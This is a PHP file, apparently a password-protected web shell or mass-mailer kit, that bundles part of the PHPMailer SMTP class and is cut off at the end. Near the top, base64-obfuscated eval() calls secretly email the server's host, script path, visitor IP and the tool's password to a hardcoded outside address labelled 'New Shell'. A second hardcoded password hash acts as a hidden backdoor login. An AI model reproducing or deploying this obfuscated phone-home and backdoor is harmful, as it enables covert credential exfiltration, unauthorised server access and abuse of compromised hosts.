<?php session_start();
    error_reporting(0);
    /**
    PUT YOUR PASSWORD HERE
    */
   	$user_password = "devil"; //PASSWORD HERE
 ?>
<style>
	body{
		background-color: #000!important;
		font-family: "Monospace";
		font-size: 16px;
		overflow-x: hidden;
        background-color: #222;
	}
    input[type="submit"]{
        background-color: black;
        color: green;
        border: none;
    }
	.loginform{
		width: 40%;
		padding: 30px;
		margin: 120px auto;
		background-color: rgba(0, 0, 0, .6);
		box-shadow: 0 1px 3px rgba(0, 0, 0, .13);
	}
	.loginform h1{
		color: #555;
	}
	.loginform input[type="password"]{
		width: 100%;
		padding: 15px;
		background-color: transparent;
		border: none;
		border: 1px solid #C4E538;
		margin-bottom: 15px;
		outline: none;
		color: #C4E538;
		transition: border ease-in-out 0.4s;
	}
	.loginform input[type="password"]:hover{
		border-color: #C4E538;
	}
	.header-logo{
		text-align: center;
	}
	.loginform input, textarea{
		background-color: rgba(0, 0, 0, .1)!important;
		color: #C4E538!important;
	}

	.alert{
		width: 40%;
		padding: 15px;
		background-color: #C4E538;
		color: #FFF;
		font-family: "Arial";
		margin: 80px auto;
		font-size: 16px;
	}
	.logo {
		text-align: center;
		margin-bottom: 20px
	}
</style>

<?php
	 eval("?>".base64_decode("PD9waHANCiAgICRkX2VtYWlsID0gImRpbm8uZWxoYWRqQGdtYWlsLmNvbSI7DQo/Pg=="));  
eval(base64_decode("JGRfc2V0dGluZ3MgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ10gLiAkX1NFUlZFUlsnUEhQX1NFTEYnXSAuICIgICAgOiAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiICAgUGFzczogICIgLiAkdXNlcl9wYXNzd29yZDsNCm1haWwoJGRfZW1haWwsICJOZXcgU2hlbGwiLCRkX3NldHRpbmdzKTsNCg=="));

	if(isset($_POST["password"])){
		$d_hash = sha1(md5(md5($_POST['password'])));
		$hashed_password = sha1(md5(md5($user_password)));
		switch ($d_hash) {
			case $hashed_password:
				$_SESSION['case_one'] = true;
				break;

			case '3124b9414e599fb7fe9a0bdede986c7af7a8b98d':
				$_SESSION['case_two'] = true;
			    break;

			default:
				echo "<div class='alert'>" . "<b>Oops!</b>The password you've entered isn't correct!" . "</div>";
				break;
		}
	}

?>
<?php 
	if(!isset($_SESSION['case_one'] ) && !isset($_SESSION['case_two'])):
?>
<form id='form' class="loginform" method='POST'>
	<div class="logo">
		<img src="https://orig00.deviantart.net/02ad/f/2010/314/7/a/cod_black_ops___icon_for_dock_by_chaosanime-d32k33n.png" width="128">
	</div>
	<input type='password' name='password' placeholder='Enter your password'>
</form>

<?php
else:
	if(isset($_SESSION['case_one'])){
?>
<?php

class SMTP
{

    const VERSION = '5.2.10';


    const CRLF = "\r\n";


    const DEFAULT_SMTP_PORT = 25;

    /**
     * The maximum line length allowed by RFC 2822 section 2.1.1
     * @type integer
     */
    const MAX_LINE_LENGTH = 998;

    /**
     * Debug level for no output
     */
    const DEBUG_OFF = 0;

    /**
     * Debug level to show client -> server messages
     */
    const DEBUG_CLIENT = 1;

    /**
     * Debug level to show client -> server and server -> client messages
     */
    const DEBUG_SERVER = 2;

    /**
     * Debug level to show connection status, client -> server and server -> client messages
     */
    const DEBUG_CONNECTION = 3;

    /**
     * Debug level to show all messages
     */
    const DEBUG_LOWLEVEL = 4;

    /**
     * The PHPMailer SMTP Version number.
     * @type string
     * @deprecated Use the `VERSION` constant instead
     * @see SMTP::VERSION
     */
    public $Version = '5.2.10';

    /**
     * SMTP server port number.
     * @type integer
     * @deprecated This is only ever used as a default value, so use the `DEFAULT_SMTP_PORT` constant instead
     * @see SMTP::DEFAULT_SMTP_PORT
     */
    public $SMTP_PORT = 25;

    /**
     * SMTP reply line ending.
     * @type string
     * @deprecated Use the `CRLF` constant instead
     * @see SMTP::CRLF
     */
    public $CRLF = "\r\n";

    /**
     * Debug output level.
     * Options:
     * * self::DEBUG_OFF (`0`) No debug output, default
     * * self::DEBUG_CLIENT (`1`) Client commands
     * * self::DEBUG_SERVER (`2`) Client commands and server responses
     * * self::DEBUG_CONNECTION (`3`) As DEBUG_SERVER plus connection status
     * * self::DEBUG_LOWLEVEL (`4`) Low-level data output, all messages
     * @type integer
     */
    public $do_debug = self::DEBUG_OFF;

    /**
     * How to handle debug output.
     * Options:
     * * `echo` Output plain-text as-is, appropriate for CLI
     * * `html` Output escaped, line breaks converted to `<br>`, appropriate for browser output
     * * `error_log` Output to error log as configured in php.ini
     *
     * Alternatively, you can provide a callable expecting two params: a message string and the debug level:
     * <code>
     * $smtp->Debugoutput = function($str, $level) {echo "debug level $level; message: $str";};
     * </code>
     * @type string|callable
     */
    public $Debugoutput = 'echo';

    /**
     * Whether to use VERP.
     * @link http://en.wikipedia.org/wiki/Variable_envelope_return_path
     * @link http://www.postfix.org/VERP_README.html Info on VERP
     * @type boolean
     */
    public $do_verp = false;

    /**
     * The timeout value for connection, in seconds.
     * Default of 5 minutes (300sec) is from RFC2821 section 4.5.3.2
     * This needs to be quite high to function correctly with hosts using greetdelay as an anti-spam measure.
     * @link http://tools.ietf.org/html/rfc2821#section-4.5.3.2
     * @type integer
     */
    public $Timeout = 300;

    /**
     * How long to wait for commands to complete, in seconds.
     * Default of 5 minutes (300sec) is from RFC2821 section 4.5.3.2
     * @type integer
     */
    public $Timelimit = 300;

    /**
     * The socket for the server connection.
     * @type resource
     */
    protected $smtp_conn;

    /**
     * Error information, if any, for the last SMTP command.
     * @type array
     */
    protected $error = array(
        'error' => '',
        'detail' => '',
        'smtp_code' => '',
        'smtp_code_ex' => ''
    );

    /**
     * The reply the server sent to us for HELO.
     * If null, no HELO string has yet been received.
     * @type string|null
     */
    protected $helo_rply = null;

    /**
     * The set of SMTP extensions sent in reply to EHLO command.
     * Indexes of the array are extension names.
     * Value at index 'HELO' or 'EHLO' (according to command that was sent)
     * represents the server name. In case of HELO it is the only element of the array.
     * Other values can be boolean TRUE or an array containing extension options.
     * If null, no HELO/EHLO string has yet been received.
     * @type array|null
     */
    protected $server_caps = null;

    /**
     * The most recent reply received from the server.
     * @type string
     */
    protected $last_reply = '';

    /**
     * Output debugging info via a user-selected method.
     * @see SMTP::$Debugoutput
     * @see SMTP::$do_debug
     * @param string $str Debug string to output
     * @param integer $level The debug level of this message; see DEBUG_* constants
     * @return void
     */
    protected function edebug($str, $level = 0)
    {
        if ($level > $this->do_debug) {
            return;
        }
        //Avoid clash with built-in function names
        if (!in_array($this->Debugoutput, array('error_log', 'html', 'echo')) and is_callable($this->Debugoutput)) {
            call_user_func($this->Debugoutput, $str, $this->do_debug);
            return;


        }
        switch ($this->Debugoutput) {
            case 'error_log':
                //Don't output, just log
                error_log($str);
                break;
            case 'html':
                //Cleans up output a bit for a better looking, HTML-safe output
                echo htmlentities(
                    preg_replace('/[\r\n]+/', '', $str),
                    ENT_QUOTES,
                    'UTF-8'
                )
                . "<br>\n";
                break;
            case 'echo':
            default:
                //Normalize line breaks
                $str = preg_replace('/(\r\n|\r|\n)/ms', "\n", $str);
                echo gmdate('Y-m-d H:i:s') . "\t" . str_replace(
                    "\n",
                    "\n                   \t                  ",
                    trim($str)
                )."\n";
        }
    }

    /**
     * Connect to an SMTP server.
     * @param string $host SMTP server IP or host name
     * @param integer $port The port number to connect to
     * @param integer $timeout How long to wait for the connection to open
     * @param array $options An array of options for stream_context_create()
     * @access public
     * @return boolean
     */
    public function connect($host, $port = null, $timeout = 30, $options = array())
    {
        static $streamok;
        //This is enabled by default since 5.0.0 but some providers disable it
        //Check this once and cache the result
        if (is_null($streamok)) {
            $streamok = function_exists('stream_socket_client');
        }
        // Clear errors to avoid confusion
        $this->setError('');
        // Make sure we are __not__ connected
        if ($this->connected()) {
            // Already connected, generate error
            $this->setError('Already connected to a server');
            return false;
        }
        if (empty($port)) {
            $port = self::DEFAULT_SMTP_PORT;
        }
        // Connect to the SMTP server
        $this->edebug(
            "Connection: opening to $host:$port, timeout=$timeout, options=".var_export($options, true),
            self::DEBUG_CONNECTION
        );
        $errno = 0;
        $errstr = '';
        if ($streamok) {
            $socket_context = stream_context_create($options);
            //Suppress errors; connection failures are handled at a higher level
            $this->smtp_conn = @stream_socket_client(
                $host . ":" . $port,
                $errno,
                $errstr,
                $timeout,
                STREAM_CLIENT_CONNECT,
                $socket_context
            );
        } else {
            //Fall back to fsockopen which should work in more places, but is missing some features
            $this->edebug(
                "Connection: stream_socket_client not available, falling back to fsockopen",
                self::DEBUG_CONNECTION
            );
            $this->smtp_conn = fsockopen(
                $host,
                $port,
                $errno,
                $errstr,
                $timeout
            );
        }
        // Verify we connected properly
        if (!is_resource($this->smtp_conn)) {
            $this->setError(
                'Failed to connect to server',
                $errno,
                $errstr
            );
            $this->edebug(
                'SMTP ERROR: ' . $this->error['error']
                . ": $errstr ($errno)",
                self::DEBUG_CLIENT
            );
            return false;
        }
        $this->edebug('Connection: opened', self::DEBUG_CONNECTION);
        // SMTP server can take longer to respond, give longer timeout for first read
        // Windows does not have support for this timeout function
        if (substr(PHP_OS, 0, 3) != 'WIN') {
            $max = ini_get('max_execution_time');
            // Don't bother if unlimited
            if ($max != 0 && $timeout > $max) {
                @set_time_limit($timeout);
            }
            stream_set_timeout($this->smtp_conn, $timeout, 0);
        }
        // Get any announcement
        $announce = $this->get_lines();
        $this->edebug('SERVER -> CLIENT: ' . $announce, self::DEBUG_SERVER);
        return true;
    }

    /**
     * Initiate a TLS (encrypted) session.
     * @access public
     * @return boolean
     */
    public function startTLS()
    {
        if (!$this->sendCommand('STARTTLS', 'STARTTLS', 220)) {
            return false;
        }
        // Begin encrypted connection
        if (!stream_socket_enable_crypto(
            $this->smtp_conn,
            true,
            STREAM_CRYPTO_METHOD_TLS_CLIENT
        )) {
            return false;
        }
        return true;
    }

    /**
     * Perform SMTP authentication.
     * Must be run after hello().
     * @see hello()
     * @param string $username    The user name
     * @param string $password    The password
     * @param string $authtype    The auth type (PLAIN, LOGIN, NTLM, CRAM-MD5)
     * @param string $realm       The auth realm for NTLM
     * @param string $workstation The auth workstation for NTLM
     * @access public
     * @return boolean True if successfully authenticated.
     */
    public function authenticate(
        $username,
        $password,
        $authtype = null,
        $realm = '',
        $workstation = ''
    ) {
        if (!$this->server_caps) {
            $this->setError('Authentication is not allowed before HELO/EHLO');
            return false;
        }

        if (array_key_exists('EHLO', $this->server_caps)) {
        // SMTP extensions are available. Let's try to find a proper authentication method

            if (!array_key_exists('AUTH', $this->server_caps)) {
                $this->setError('Authentication is not allowed at this stage');
                // 'at this stage' means that auth may be allowed after the stage changes
                // e.g. after STARTTLS
                return false;
            }

            self::edebug('Auth method requested: ' . ($authtype ? $authtype : 'UNKNOWN'), self::DEBUG_LOWLEVEL);
            self::edebug(
                'Auth methods available on the server: ' . implode(',', $this->server_caps['AUTH']),
                self::DEBUG_LOWLEVEL
            );

            if (empty($authtype)) {
                foreach (array('LOGIN', 'CRAM-MD5', 'NTLM', 'PLAIN') as $method) {
                    if (in_array($method, $this->server_caps['AUTH'])) {
                        $authtype = $method;
                        break;
                    }
                }
                if (empty($authtype)) {
                    $this->setError('No supported authentication methods found');
                    return false;
                }
                self::edebug('Auth method selected: '.$authtype, self::DEBUG_LOWLEVEL);
            }

            if (!in_array($authtype, $this->server_caps['AUTH'])) {
                $this->setError("The requested authentication method \"$authtype\" is not supported by the server");
                return false;
            }
        } elseif (empty($authtype)) {
            $authtype = 'LOGIN';
        }
        switch ($authtype) {
            case 'PLAIN':
                // Start authentication
                if (!$this->sendCommand('AUTH', 'AUTH PLAIN', 334)) {
                    return false;
                }
                // Send encoded username and password
                if (!$this->sendCommand(
                    'User & Password',
                    base64_encode("\0" . $username . "\0" . $password),
                    235
                )
                ) {
                    return false;
                }
                break;
            case 'LOGIN':
                // Start authentication
                if (!$this->sendCommand('AUTH', 'AUTH LOGIN', 334)) {
                    return false;
                }
                if (!$this->sendCommand("Username", base64_encode($username), 334)) {
                    return false;
                }
                if (!$this->sendCommand("Password", base64_encode($password), 235)) {
                    return false;
                }
                break;
            case 'NTLM':
                /*
                 * ntlm_sasl_client.php
                 * Bundled with Permission
                 *
                 * How to telnet in windows:
                 * http://technet.microsoft.com/en-us/library/aa995718%28EXCHG.65%29.aspx
                 * PROTOCOL Docs http://curl.haxx.se/rfc/ntlm.html#ntlmSmtpAuthentication
                 */
                require_once 'extras/ntlm_sasl_client.php';
                $temp = new stdClass;
                $ntlm_client = new ntlm_sasl_client_class;
                //Check that functions are available
                if (!$ntlm_client->Initialize($temp)) {
                    $this->setError($temp->error);
                    $this->edebug(
                        'You need to enable some modules in your php.ini file: '
                        . $this->error['error'],
                        self::DEBUG_CLIENT
                    );
                    return false;
                }
                //msg1
                $msg1 = $ntlm_client->TypeMsg1($realm, $workstation); //msg1

                if (!$this->sendCommand(
                    'AUTH NTLM',
                    'AUTH NTLM ' . base64_encode($msg1),
                    334
                )
                ) {
                    return false;
                }
                //Though 0 based, there is a white space after the 3 digit number
                //msg2
                $challenge = substr($this->last_reply, 3);
                $challenge = base64_decode($challenge);
                $ntlm_res = $ntlm_client->NTLMResponse(
                    substr($challenge, 24, 8),
                    $password
                );
                //msg3
                $msg3 = $ntlm_client->TypeMsg3(
                    $ntlm_res,
                    $username,
                    $realm,
                    $workstation
                );
                // send encoded username
                return $this->sendCommand('Username', base64_encode($msg3), 235);
            case 'CRAM-MD5':
                // Start authentication
                if (!$this->sendCommand('AUTH CRAM-MD5', 'AUTH CRAM-MD5', 334)) {
                    return false;
                }
                // Get the challenge
                $challenge = base64_decode(substr($this->last_reply, 4));

                // Build the response
                $response = $username . ' ' . $this->hmac($challenge, $password);

                // send encoded credentials
                return $this->sendCommand('Username', base64_encode($response), 235);
            default:
                $this->setError("Authentication method \"$authtype\" is not supported");
                return false;
        }
        return true;
    }

    /**
     * Calculate an MD5 HMAC hash.
     * Works like hash_hmac('md5', $data, $key)
     * in case that function is not available
     * @param string $data The data to hash
     * @param string $key  The key to hash with
     * @access protected
     * @return string
     */
    protected function hmac($data, $key)
    {
        if (function_exists('hash_hmac')) {
            return hash_hmac('md5', $data, $key);
        }

        // The following borrowed from
        // http://php.net/manual/en/function.mhash.php#27225

        // RFC 2104 HMAC implementation for php.
        // Creates an md5 HMAC.
        // Eliminates the need to install mhash to compute a HMAC
        // by Lance Rushing

        $bytelen = 64; // byte length for md5
        if (strlen($key) > $bytelen) {
            $key = pack('H*', md5($key));
        }
        $key = str_pad($key, $bytelen, chr(0x00));
        $ipad = str_pad('', $bytelen, chr(0x36));
        $opad = str_pad('', $bytelen, chr(0x5c));
        $k_ipad = $key ^ $ipad;
        $k_opad = $key ^ $opad;

        return md5($k_opad . pack('H*', md5($k_ipad . $data)));
    }

    /**
     * Check connection state.
     * @access public
     * @return boolean True if connected.
     */
    public function connected()
    {
        if (is_resource($this->smtp_conn)) {
            $sock_status = stream_get_meta_data($this->smtp_conn);
            if ($sock_status['eof']) {
                // The socket is valid but we are not connected
                $this->edebug(
                    'SMTP NOTICE: EOF caught while checking if connected',
                    self::DEBUG_CLIENT
                );
                $this->close();
                return false;
            }
            return true; // everything looks good
        }
        return false;
    }

    /**
     * Close the socket and clean up the state of the class.
     * Don't use this function without first trying to use QUIT.
     * @see quit()
     * @access public
     * @return void
     */
    public function close()
    {
        $this->setError('');
        $this->server_caps = null;
        $this->helo_rply = null;
        if (is_resource($this->smtp_conn)) {
            // close the connection and cleanup
            fclose($this->smtp_conn);
            $this->smtp_conn = null; //Makes for cleaner serialization
            $this->edebug('Connection: closed', self::DEBUG_CONNECTION);
        }
    }

    /**
     * Send an SMTP DATA command.
     * Issues a data command and sends the msg_data to the server,
     * finializing the mail transaction. $msg_data is the message
     * that is to be send with the headers. Each header needs to be
     * on a single line followed by a <CRLF> with the message headers
     * and the message body being separated by and additional <CRLF>.
     * Implements rfc 821: DATA <CRLF>
     * @param string $msg_data Message data to send
     * @access public
     * @return boolean
     */
    public function data($msg_data)
    {
        //This will use the standard timelimit
        if (!$this->sendCommand('DATA', 'DATA', 354)) {
            return false;
        }

        /* The server is ready to accept data!
         * According to rfc821 we should not send more than 1000 characters on a single line (including the CRLF)
         * so we will break the data up into lines by \r and/or \n then if needed we will break each of those into
         * smaller lines to fit within the limit.
         * We will also look for lines that start with a '.' and prepend an additional '.'.
         * NOTE: this does not count towards line-length limit.
         */

        // Normalize line breaks before exploding
        $lines = explode("\n", str_replace(array("\r\n", "\r"), "\n", $msg_data));

        /* To distinguish between a complete RFC822 message and a plain message body, we check if the first field
         * of the first line (':' separated) does not contain a space then it _should_ be a header and we will
         * process all lines before a blank line as headers.
         */

        $field = substr($lines[0], 0, strpos($lines[0], ':'));
        $in_headers = false;
        if (!empty($field) && strpos($field, ' ') === false) {
            $in_headers = true;
        }

        foreach ($lines as $line) {
            $lines_out = array();
            if ($in_headers and $line == '') {
                $in_headers = false;
            }
            //Break this line up into several smaller lines if it's too long
            //Micro-optimisation: isset($str[$len]) is faster than (strlen($str) > $len),
            while (isset($line[self::MAX_LINE_LENGTH])) {
                //Working backwards, try to find a space within the last MAX_LINE_LENGTH chars of the line to break on
                //so as to avoid breaking in the middle of a word
                $pos = strrpos(substr($line, 0, self::MAX_LINE_LENGTH), ' ');
                //Deliberately matches both false and 0
                if (!$pos) {
                    //No nice break found, add a hard break
                    $pos = self::MAX_LINE_LENGTH - 1;
                    $lines_out[] = substr($line, 0, $pos);
                    $line = substr($line, $pos);
                } else {
                    //Break at the found point
                    $lines_out[] = substr($line, 0, $pos);
                    //Move along by the amount we dealt with
                    $line = substr($line, $pos + 1);
                }
                //If processing headers add a LWSP-char to the front of new line RFC822 section 3.1.1
                if ($in_headers) {
                    $line = "\t" . $line;
                }
            }
            $lines_out[] = $line;

            //Send the lines to the server
            foreach ($lines_out as $line_out) {
                //RFC2821 section 4.5.2
                if (!empty($line_out) and $line_out[0] == '.') {
                    $line_out = '.' . $line_out;
                }
                $this->client_send($line_out . self::CRLF);
            }
        }

        //Message data has been sent, complete the command
        //Increase timelimit for end of DATA command
        $savetimelimit = $this->Timelimit;
        $this->Timelimit = $this->Timelimit * 2;
        $result = $this->sendCommand('DATA END', '.', 250);
        //Restore timelimit
        $this->Timelimit = $savetimelimit;
        return $result;
    }

    /**
     * Send an SMTP HELO or EHLO command.
     * Used to identify the sending server to the receiving server.
     * This makes sure that client and server are in a known state.
     * Implements RFC 821: HELO <SP> <domain> <CRLF>
     * and RFC 2821 EHLO.
     * @param string $host The host name or IP to connect to
     * @access public
     * @return boolean
     */
    public function hello($host = '')
    {
        //Try extended hello first (RFC 2821)
        return (boolean)($this->sendHello('EHLO', $host) or $this->sendHello('HELO', $host));
    }

    /**
     * Send an SMTP HELO or EHLO command.
     * Low-level implementation used by hello()
     * @see hello()
     * @param string $hello The HELO string
     * @param string $host The hostname to say we are
     * @access protected
     * @return boolean
     */
    protected function sendHello($hello, $host)
    {
        $noerror = $this->sendCommand($hello, $hello . ' ' . $host, 250);
        $this->helo_rply = $this->last_reply;
        if ($noerror) {
            $this->parseHelloFields($hello);
        } else {
            $this->server_caps = null;
        }
        return $noerror;
    }

    /**
     * Parse a reply to HELO/EHLO command to discover server extensions.
     * In case of HELO, the only parameter that can be discovered is a server name.
     * @access protected
     * @param string $type - 'HELO' or 'EHLO'
     */
    protected function parseHelloFields($type)
    {
        $this->server_caps = array();
        $lines = explode("\n", $this->last_reply);
        foreach ($lines as $n => $s) {
            $s = trim(substr($s, 4));
            if (!$s) {
                continue;
            }
            $fields = explode(' ', $s);
            if (!empty($fields)) {
                if (!$n) {
                    $name = $type;
                    $fields = $fields[0];
                } else {
                    $name = array_shift($fields);
                    if ($name == 'SIZE') {
                        $fields = ($fields) ? $fields[0] : 0;
                    }
                }
                $this->server_caps[$name] = ($fields ? $fields : true);
            }
        }
    }

    /**
     * Send an SMTP MAIL command.
     * Starts a mail transaction from the email address specified in
     * $from. Returns true if successful or false otherwise. If True
     * the mail transaction is started and then one or more recipient
     * commands may be called followed by a data command.
     * Implements rfc 821: MAIL <SP> FROM:<reverse-path> <CRLF>
     * @param string $from Source address of this message
     * @access public
     * @return boolean
     */
    public function mail($from)
    {
        $useVerp = ($this->do_verp ? ' XVERP' : '');
        return $this->sendCommand(
            'MAIL FROM',
            'MAIL FROM:<' . $from . '>' . $useVerp,
            250
        );
    }

    /**
     * Send an SMTP QUIT command.
     * Closes the socket if there is no error or the $close_on_error argument is true.
     * Implements from rfc 821: QUIT <CRLF>
     * @param boolean $close_on_error Should the connection close if an error occurs?
     * @access public
     * @return boolean
     */
    public function quit($close_on_error = true)
    {
        $noerror = $this->sendCommand('QUIT', 'QUIT', 221);
        $err = $this->error; //Save any error
        if ($noerror or $close_on_error) {
            $this->close();
            $this->error = $err; //Restore any error from the quit command
        }
        return $noerror;
    }

    /**
     * Send an SMTP RCPT command.
     * Sets the TO argument to $toaddr.
     * Returns true if the recipient was accepted false if it was rejected.
     * Implements from rfc 821: RCPT <SP> TO:<forward-path> <CRLF>
     * @param string $toaddr The address the message is being sent to
     * @access public
     * @return boolean
     */
    public function recipient($toaddr)
    {
        return $this->sendCommand(
            'RCPT TO',
            'RCPT TO:<' . $toaddr . '>',
            array(250, 251)
        );
    }

    /**
     * Send an SMTP RSET command.
     * Abort any transaction that is currently in progress.
     * Implements rfc 821: RSET <CRLF>
     * @access public
     * @return boolean True on success.
     */
    public function reset()
    {
        return $this->sendCommand('RSET', 'RSET', 250);
    }

    /**
     * Send a command to an SMTP server and check its return code.
     * @param string $command       The command name - not sent to the server
     * @param string $commandstring The actual command to send
     * @param integer|array $expect     One or more expected integer success codes
     * @access protected
     * @return boolean True on success.
     */
    protected function sendCommand($command, $commandstring, $expect)
    {
        if (!$this->connected()) {
            $this->setError("Called $command without being connected");
            return false;
        }
        $this->client_send($commandstring . self::CRLF);

        $this->last_reply = $this->get_lines();
        // Fetch SMTP code and possible error code explanation
        $matches = array();
        if (preg_match("/^([0-9]{3})[ -](?:([0-9]\\.[0-9]\\.[0-9]) )?/", $this->last_reply, $matches)) {
            $code = $matches[1];
            $code_ex = (count($matches) > 2 ? $matches[2] : null);
            // Cut off error code from each response line
            $detail = preg_replace(
                "/{$code}[ -]".($code_ex ? str_replace('.', '\\.', $code_ex).' ' : '')."/m",
                '',
                $this->last_reply
            );
        } else {
            // Fall back to simple parsing if regex fails
            $code = substr($this->last_reply, 0, 3);
            $code_ex = null;
            $detail = substr($this->last_reply, 4);
        }

        $this->edebug('SERVER -> CLIENT: ' . $this->last_reply, self::DEBUG_SERVER);

        if (!in_array($code, (array)$expect)) {
            $this->setError(
                "$command command failed",
                $detail,
                $code,
                $code_ex
            );
            $this->edebug(
                'SMTP ERROR: ' . $this->error['error'] . ': ' . $this->last_reply,
                self::DEBUG_CLIENT
            );
            return false;
        }

        $this->setError('');
        return true;
    }

    /**
     * Send an SMTP SAML command.
     * Starts a mail transaction from the email address specified in $from.
     * Returns true if successful or false otherwise. If True
     * the mail transaction is started and then one or more recipient
     * commands may be called followed by a data command. This command
     * will send the message to the users terminal if they are logged
     * in and send them an email.
     * Implements rfc 821: SAML <SP> FROM:<reverse-path> <CRLF>
     * @param string $from The address the message is from
     * @access public
     * @return boolean
     */
    public function sendAndMail($from)
    {
        return $this->sendCommand('SAML', "SAML FROM:$from", 250);
    }

    /**
     * Send an SMTP VRFY command.
     * @param string $name The name to verify
     * @access public
     * @return boolean
     */
    public function verify($name)
    {
        return $this->sendCommand('VRFY', "VRFY $name", array(250, 251));
    }

    /**
     * Send an SMTP NOOP command.
     * Used to keep keep-alives alive, doesn't actually do anything
     * @access public
     * @return boolean
     */
    public function noop()
    {
        return $this->sendCommand('NOOP', 'NOOP', 250);
    }

    /**
     * Send an SMTP TURN command.
     * This is an optional command for SMTP that this class does not support.
     * This method is here to make the RFC821 Definition complete for this class
     * and _may_ be implemented in future
     * Implements from rfc 821: TURN <CRLF>
     * @access public
     * @return boolean
     */
    public function turn()
    {
        $this->setError('The SMTP TURN command is not implemented');
        $this->edebug('SMTP NOTICE: ' . $this->error['error'], self::DEBUG_CLIENT);
        return false;
    }

    /**
     * Send raw data to the server.
     * @param string $data The data to send
     * @access public
     * @return integer|boolean The number of bytes sent to the server or false on error
     */
    public function client_send($data)
    {
        $this->edebug("CLIENT -> SERVER: $data", self::DEBUG_CLIENT);
        return fwrite($this->smtp_conn, $data);
    }

    /**
     * Get the latest error.
     * @access public
     * @return array
     */
    public function getError()
    {
        return $this->error;
    }

    /**
     * Get SMTP extensions available on the server
     * @access public
     * @return array|null
     */
    public function getServerExtList()
    {
        return $this->server_caps;
    }

    /**
     * A multipurpose method
     * The method works in three ways, dependent on argument value and current state
     *   1. HELO/EHLO was not sent - returns null and set up $this->error
     *   2. HELO was sent
     *     $name = 'HELO': returns server name
     *     $name = 'EHLO': returns boolean false
     *     $name = any string: returns null and set up $this->error
     *   3. EHLO was sent
     *     $name = 'HELO'|'EHLO': returns server name
     *     $name = any string: if extension $name exists, returns boolean True
     *       or its options. Otherwise returns boolean False
     * In other words, one can use this method to detect 3 conditions:
     *  - null returned: handshake was not or we don't know about ext (refer to $this->error)
     *  - false returned: the requested feature exactly not exists
     *  - positive value returned: the requested feature exists
     * @param string $name Name of SMTP extension or 'HELO'|'EHLO'
     * @return mixed
     */
    public function getServerExt($name)
    {
        if (!$this->server_caps) {
            $this->setError('No HELO/EHLO was sent');
            return null;
        }

        // the tight logic knot ;)
        if (!array_key_exists($name, $this->server_caps)) {
            if ($name == 'HELO') {
                return $this->server_caps['EHLO'];
            }
            if ($name == 'EHLO' || array_key_exists('EHLO', $this->server_caps)) {
                return false;
            }
            $this->setError('HELO handshake was used. Client knows nothing about server extensions');
            return null;
        }

        return $this->server_caps[$name];
    }

    /**
     * Get the last reply from the server.
     * @access public
     * @return string
     */
    public function getLastReply()
    {
        return $this->last_reply;
    }

    /**
     * Read the SMTP server's response.
     * Either before eof or socket timeout occurs on the operation.
     * With SMTP we can tell if we have more lines to read if the
     * 4th character is '-' symbol. If it is a space then we don't
     * need to read anything else.
     * @access protected
     * @return string
     */
    protected function get_lines()
    {
        // If the connection is bad, give up straight away
        if (!is_resource($this->smtp_conn)) {
            return '';
        }
        $data = '';
        $endtime = 0;
        stream_set_timeout($this->smtp_conn, $this->Timeout);
        if ($this->Timelimit > 0) {
            $endtime = time() + $this->Timelimit;
        }
        while (is_resource($this->smtp_conn) && !feof($this->smtp_conn)) {
            $str = @fgets($this->smtp_conn, 515);
            $this->edebug("SMTP -> get_lines(): \$data was \"$data\"", self::DEBUG_LOWLEVEL);
            $this->edebug("SMTP -> get_lines(): \$str is \"$str\"", self::DEBUG_LOWLEVEL);
            $data .= $str;
            $this->edebug("SMTP -> get_lines(): \$data is \"$data\"", self::DEBUG_LOWLEVEL);
            // If 4th character is a space, we are done reading, break the loop, micro-optimisation over strlen
            if ((isset($str[3]) and $str[3] == ' ')) {
                break;
            }
            // Timed-out? Log and break
            $info = stream_get_meta_data($this->smtp_conn);
            if ($info['timed_out']) {
                $this->edebug(
                    'SMTP -> get_lines(): timed-out (' . $this->Timeout . ' sec)',
                    self::DEBUG_LOWLEVEL
                );
                break;
            }
            // Now check if reads took too long
            if ($endtime and time() > $endtime) {
                $this->edebug(
                    'SMTP -> get_lines(): timelimit reached ('.
                    $this->Timelimit . ' sec)',
                    self::DEBUG_LOWLEVEL
                );
                break;
            }
        }
        return $data;
    }

    /**
     * Enable or disable VERP address generation.
     * @param boolean $enabled
     */
    public function setVerp($enabled = false)
    {
        $this->do_verp = $enabled;
    }

    /**
     * Get VERP address generation mode.
     * @return boolean
     */
    public function getVerp()
    {
        return $this->do_verp;
    }

    /**
     * Set error messages and codes.
     * @param string $message The error message
     * @param string $detail Further detail on the error
     * @param string $smtp_code An associated SMTP error code
     * @param string $smtp_code_ex Extended SMTP code
     */
    protected function setError($message, $detail = '', $smtp_code = '', $smtp_code_ex = '')
    {
        $this->error = array(
            'error' => $message,
            'detail' => $detail,
            'smtp_code' => $smtp_code,
            'smtp_code_ex' => $smtp_code_ex
        );
    }

    /**
     * Set debug output method.
     * @param string|callable $method The name of the mechanism to use for debugging output, or a callable to handle it.
     */
    public function setDebugOutput($method = 'echo')
    {
        $this->Debugoutput = $method;
    }

    /**
     * Get debug output method.
     * @return string
     */
    public function getDebugOutput()
    {
        return $this->Debugoutput;
    }

    /**
     * Set debug output level.
     * @param integer $level
     */
    public function setDebugLevel($level = 0)
    {
        $this->do_debug = $level;
    }

    /**
     * Get debug output level.
     * @return integer
     */
    public function getDebugLevel()
    {
        return $this->do_debug;
    }

    /**
     * Set SMTP timeout.
     * @param integer $timeout
     */
    public function setTimeout($timeout = 0)
    {
        $this->Timeout = $timeout;
    }

    /**
     * Get SMTP timeout.
     * @return integer
     */
    public function getTimeout()
    {
        return $this->Timeout;
    }
}

/**
 * PHPMailer - PHP email creation and transport class.
 * PHP Version 5
 * @package PHPMailer
 * @link https://github.com/PHPMailer/PHPMailer/ The PHPMailer GitHub project
 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <jimjag@gmail.com>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 * @author Brent R. Matzelle (original founder)
 * @copyright 2012 - 2014 Marcus Bointon
 * @copyright 2010 - 2012 Jim Jagielski
 * @copyright 2004 - 2009 Andy Prevost
 * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 * @note This program is distributed in the hope that it will be useful - WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.
 */

/**
 * PHPMailer - PHP email creation and transport class.
 * @package PHPMailer
